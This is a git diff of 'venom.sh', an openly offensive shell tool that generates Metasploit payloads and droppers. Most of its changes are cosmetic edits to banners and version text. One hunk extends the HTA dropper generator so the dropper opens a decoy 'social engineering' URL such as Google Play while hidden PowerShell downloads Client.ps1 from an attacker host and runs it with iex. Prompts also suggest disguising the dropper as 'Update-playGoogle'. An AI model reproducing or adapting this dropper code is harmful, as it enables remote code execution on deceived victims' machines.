@@ -1,16 +1,13 @@
 #!/bin/sh
 # --------------------------------------------------------------
 # venom - metasploit Shellcode generator/compiler/listenner
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: v1.0.17
-# Suspicious-Shell-Activity (SSA) RedTeam develop @2017 - @2020
-# codename: Shinigami [ GPL licensed ]
+# Suspicious-Shell-Activity (SSA) RedTeam @2017 - @2020
+# codename: Shinigami (GPL licensed)
+# Stable version: 1.0.17
+# Dev version: 1.0.17.5
 # --------------------------------------------------------------
-# [DEPENDENCIES]
-# "venom.sh will download/install all dependencies as they are needed"
-# Zenity | Metasploit | GCC (unix) |  Pyinstaller (python-to-exe module)
-# mingw32 (compile .EXE executables) | pyherion.py (crypter)
-# PEScrambler.exe (PE obfuscator/scrambler) | apache2 webserver
-# vbs-obfuscator | encrypt_PolarSSL | ettercap (dns_spoof) | WINE
+# [INSTALL DEPENDENCIES]
+# cd aux && sudo ./setup.sh
 # --------------------------------------------------------------
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
@@ -225,8 +222,8 @@ echo "    ║  ${YellowF}But to give to its users the first glance of how shellc
 echo "    ║  ${YellowF}build, embedded into one template (any language), obfuscated${BlueF}  ║"
 echo "    ║  ${YellowF}(e.g pyherion.py) and compiled into one executable file.${BlueF}      ║"
 echo "    ╠════════════════════════════════════════════════════════════════╝"
-echo "    | Author: r00t-3xp10it | Suspicious_Shell_Activity (red_team)"
-echo "    ╘ VERSION:${YellowF}$ver ${BlueF}USER:${YellowF}$user ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${Reset}
+echo "    ║ Author: r00t-3xp10it | Suspicious Shell Activity (Red Team)"
+echo "    ╚ VERSION:${YellowF}$ver ${BlueF}USER:${YellowF}$user ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${Reset}
 echo "" && echo ""
 sleep 1
 echo ${BlueF}[☠]${white} Press [${GreenF} ENTER ${white}] to continue ..${Reset}
@@ -12242,7 +12239,7 @@ if [ "$Chts" = "ON" ]; then
 fi
 
 
-echo "${BlueF}[☠]${white} Exit Console -> Stoping Services."${Reset};
+echo "${BlueF}[☠]${white} Exit Console => Stoping Services."${Reset};
 sleep 1
 if [ "$DiStR0" = "Kali" ]; then
 service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
@@ -13666,13 +13663,18 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 443" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-playGoogle\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com\nWarning: CN must be a valid Domain Name." --entry --width 300) > /dev/null 2>&1
+if [ "$easter_egg" = "ON" ]; then
+   SE=$(zenity --title="☠ Social Engineering URL ☠" --text "Enter social engineering url to open.\nExample: https://play.google.com/store" --entry --width 300) > /dev/null 2>&1
+fi
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
 if [ -z "$Drop" ]; then Drop="Update-playGoogle";fi
+if [ -z "$SE" ]; then SE="https://play.google.com/store";fi
 if [ "$easter_egg" = "OFF" ]; then Ext="bat";else Ext="hta";fi
+
 
 ## Display final settings to user.
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 1
@@ -13700,7 +13702,8 @@ if [ "$easter_egg" = "ON" ]; then
    echo "Framework: Venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
    echo "<script>" >> $IPATH/output/$Drop.$Ext
    echo "a=new ActiveXObject(\"WScript.Shell\");" >> $IPATH/output/$Drop.$Ext
-   echo "a.run(\"powershell -w 1 \$MyCat=New-Object -Com WinHttp.WinHttpRequest.5.1;\$MyCat.open('GET','http://$lhost/Client.ps1',\$false);\$MyCat.send();iex \$MyCat.responseText;\", 0);window.close();" >> $IPATH/output/$Drop.$Ext
+   echo "a.run(\"powershell -w 1 start $SE;\$MyCat=New-Object -Com WinHttp.WinHttpRequest.5.1;\$MyCat.open('GET','http://$lhost/Client.ps1',\$false);\$MyCat.send();iex \$MyCat.responseText;\", 0);" >> $IPATH/output/$Drop.$Ext
+   echo "window.close();" >> $IPATH/output/$Drop.$Ext
    echo "</script>" >> $IPATH/output/$Drop.$Ext
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Dropper.hta html file written to output.";sleep 1
 else
@@ -14551,7 +14554,7 @@ cat << !
             __    _ ______  ____   _  _____  ____    __
            \  \  //|   ___||    \ | |/     \|    \  /  |
             \  \// |   ___||     \| ||     ||     \/   |
-             \__/  |______||__/\____|\_____/|__/\__/|__|$ver
+             \__/  |______||__/\____|\_____/|__/\__/|__|V$ver
 !
 echo "       ${BlueF}USER:${YellowF}$user ${BlueF}ENV:${YellowF}$EnV ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${BlueF}
 cat << !
@@ -14568,7 +14571,7 @@ cat << !
     ║   E - Exit Shellcode Generator                              ║
     ╚═════════════════════════════════════════════════════════════╣
 !
-echo "                                                  ${YellowF}SSA${RedF}RedTeam${YellowF}@2020${BlueF}_|"
+echo "                                                  ${YellowF}SSA${RedF}RedTeam${YellowF}@2020${BlueF} ╝"
 
 echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
 sleep 1
